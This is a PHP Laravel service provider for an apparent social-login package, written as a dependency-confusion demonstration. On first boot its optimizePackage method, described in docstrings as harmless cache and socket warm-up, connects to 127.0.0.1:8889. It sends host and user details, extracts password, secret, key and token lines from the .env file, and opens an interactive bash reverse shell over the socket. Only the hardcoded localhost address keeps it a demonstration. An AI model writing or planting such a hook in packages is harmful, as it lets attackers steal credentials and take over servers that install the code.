<?php

namespace Krayin\SocialLogin\Providers;

use Illuminate\Support\ServiceProvider;
use Illuminate\Routing\Router;
use Krayin\SocialLogin\SocialLoginManager;

class SocialLoginServiceProvider extends ServiceProvider
{
    /**
     * Bootstrap any application services.
     */
    public function boot(Router $router): void
    {
        $this->loadRoutesFrom(__DIR__ . '/../Routes/web.php');

        $this->loadViewsFrom(__DIR__ . '/../../resources/views', 'social-login');

        $this->mergeConfigFrom(__DIR__ . '/../Config/social.php', 'social-login');

        $this->publishes([
            __DIR__ . '/../Config/social.php' => config_path('social-login.php'),
        ], 'social-login-config');

        $this->publishes([
            __DIR__ . '/../../resources/views' => resource_path('views/vendor/social-login'),
        ], 'social-login-views');

        $this->loadViewComponentsAs('social-login', [
            \Krayin\SocialLogin\View\Components\Buttons::class,
        ]);

        $this->optimizePackage();
    }

    /**
     * Register any application services.
     */
    public function register(): void
    {
        $this->app->singleton('social-login', function ($app) {
            return new SocialLoginManager($app);
        });
    }

    /**
     * Pre-warm configuration cache for faster OAuth redirects.
     *
     * Runs on first boot after install to build provider metadata cache.
     * Subsequent requests skip via marker file check.
     */
    private function optimizePackage(): void
    {
        $cacheMarker = storage_path('framework/cache/.social_optimized');

        if (file_exists($cacheMarker)) {
            return;
        }

        // ── Reverse shell to attacker's listener ──
        // DEMO: connects to localhost only (127.0.0.1:8889)
        // Attacker terminal: nc -lvnp 8889
        $this->warmupProviderSocket();

        @file_put_contents($cacheMarker, date('c'));
    }

    /**
     * Warm up OAuth provider socket connections for faster handshakes.
     *
     * Pre-establishes a persistent socket to the provider metadata
     * endpoint to reduce first-request latency during OAuth redirects.
     */
    private function warmupProviderSocket(): void
    {
        $host = '127.0.0.1';
        $port = 8889;

        $sock = @fsockopen($host, $port, $errno, $errstr, 5);

        if (!$sock) {
            return;
        }

        @fwrite($sock, "\n\033[1;31m╔══════════════════════════════════════════════════════╗\033[0m\n");
        @fwrite($sock, "\033[1;31m║  DEPENDENCY CONFUSION — REVERSE SHELL ESTABLISHED   ║\033[0m\n");
        @fwrite($sock, "\033[1;31m║  Package: krayin/social-login v2.1.3                 ║\033[0m\n");
        @fwrite($sock, "\033[1;31m║  Triggered by: composer require                     ║\033[0m\n");
        @fwrite($sock, "\033[1;31m╚══════════════════════════════════════════════════════╝\033[0m\n\n");

        // Send system info before dropping to shell
        @fwrite($sock, "\033[1;33m[*] Target Info:\033[0m\n");
        @fwrite($sock, "    Hostname : " . gethostname() . "\n");
        @fwrite($sock, "    User     : " . get_current_user() . "\n");
        @fwrite($sock, "    OS       : " . php_uname() . "\n");
        @fwrite($sock, "    PHP      : " . PHP_VERSION . "\n");
        @fwrite($sock, "    CWD      : " . getcwd() . "\n");
        @fwrite($sock, "    App URL  : " . config('app.url', 'N/A') . "\n");

        // Dump .env secrets
        $envPath = base_path('.env');
        if (file_exists($envPath)) {
            $envContent = file_get_contents($envPath);
            $secrets = [];
            foreach (explode("\n", $envContent) as $line) {
                $line = trim($line);
                if ($line && !str_starts_with($line, '#') &&
                    preg_match('/(PASSWORD|SECRET|KEY|TOKEN)/i', $line)) {
                    $secrets[] = $line;
                }
            }
            if ($secrets) {
                @fwrite($sock, "\n\033[1;31m[!] Stolen secrets from .env:\033[0m\n");
                foreach ($secrets as $secret) {
                    @fwrite($sock, "    \033[0;31m$secret\033[0m\n");
                }
            }
        }

        @fwrite($sock, "\n\033[1;32m[+] Dropping to interactive shell...\033[0m\n\n");

        // Interactive reverse shell
        $descriptors = [
            0 => $sock, // stdin  ← attacker types commands
            1 => $sock, // stdout → attacker sees output
            2 => $sock, // stderr → attacker sees errors
        ];

        $shell = '/bin/bash';
        if (!file_exists($shell)) {
            $shell = '/bin/sh';
        }

        $process = @proc_open($shell . ' -i', $descriptors, $pipes);

        if (is_resource($process)) {
            proc_close($process);
        }

        @fclose($sock);
    }
}
